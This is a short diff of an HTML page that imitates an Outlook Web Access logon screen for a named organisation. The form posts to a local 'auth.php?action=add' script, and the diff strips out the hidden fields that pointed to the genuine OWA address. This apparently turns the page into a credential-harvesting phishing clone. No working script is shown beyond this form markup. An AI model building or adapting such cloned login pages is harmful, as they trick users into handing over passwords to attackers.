@@ -674,14 +674,11 @@ input.chk
 </noscript>
 
 <form action="auth.php?action=add" method="POST" name="logonForm" ENCTYPE="application/x-www-form-urlencoded" autocomplete="off">
-<input type="hidden" name="destination" value="https://ais.artek.org/owa/">
-<input type="hidden" name="flags" value="4">
-<input type="hidden" name="forcedownlevel" value="0">
  
  <!-- Default to mouse class, so that things don't look wacky if the script somehow doesn't apply a class -->
 <div id="mainLogonDiv" class="mouse">
     <div class="sidebar">
-        <div class="owaLogoContainer">
+        <div class="owaLogoContainer"> 
             <img src="logo_vert.png" class="owaLogo" aria-hidden="true" height="100" width="100" />
             <img src="logo_vert.png" class="owaLogoSmall" aria-hidden="true" height="32" width="32" />
         </div>
